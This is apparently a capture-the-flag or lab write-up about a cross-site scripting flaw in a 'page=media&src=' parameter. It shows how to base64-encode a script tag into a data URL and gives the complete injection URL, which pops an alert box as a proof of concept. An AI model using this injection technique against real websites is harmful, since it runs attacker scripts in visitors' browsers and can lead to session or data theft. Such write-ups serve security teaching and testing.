# Data URL (XSS)

You can see the NSA (National Security Agency) logo in the homepage is loaded from a data URL.
```html
<a href="?page=media&amp;src=nsa">
	<img src="images/nsa_prism.jpg" alt="">
</a>
```

If we access to the image URL: `/?page=media&src=nsa`, we can see the image is loaded from a data URL (check the Network tab in the browser developer tools). In this way we can add our own file to the data URL and execute it in the browser. Doing `/?page=media&src=mycustomfile` won't work because the file is not in the server, but we can use a data URL to load our own file. To do this, we need to encode our file in base64. Example:
```html
<script>alert('banger');</script>
```
In base64, this will be:
```
PHNjcmlwdD5hbGVydCgnYmFuZ2VyJyk7PC9zY3JpcHQ+
```
Then we can create a data URL like this:
```html
data:text/html;base64,PHNjcmlwdD5hbGVydCgnYmFuZ2VyJyk7PC9zY3JpcHQ+
```
And then we can use it in the URL:
```
/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnYmFuZ2VyJyk7PC9zY3JpcHQ+
```